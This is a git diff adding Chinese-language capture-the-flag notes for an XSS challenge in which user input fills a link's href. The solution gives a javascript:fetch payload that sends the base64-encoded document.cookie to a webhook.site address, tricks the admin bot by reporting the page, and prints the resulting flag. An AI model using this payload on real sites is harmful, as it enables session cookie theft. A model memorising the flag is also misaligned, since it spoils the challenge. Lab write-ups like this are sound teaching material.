@@ -98,6 +98,20 @@
 
 ---
 # XSS3
+
+## 題目
+長得跟 [[#題目|XSS1]] 差不多，但大標變為 `XSS3 - Video Button`
+輸入連結網址後，會跳到 Video Button 的頁面，內含網址超連結
+```js
+<a id="videobtn" href="[輸入]">Your video button</a>
 ```
-javascript:fetch(...)
-```
+## 解題
+1. 在 `herf=""` 中插入 script -> 輸入區輸入：
+   ```js
+   javascript:fetch("https://webhook.site/[webhook網址]?aaa="+btoa(document.cookie))
+   ```
+2. 到 Report to admin 輸入 Video Butto 網址，並到 webhook 找
+   ![[W6-3_aaa.png]]
+3. base64 decode ->flag=`CTF{xss3_62601b11047ff0d70cb19208}`
+
+
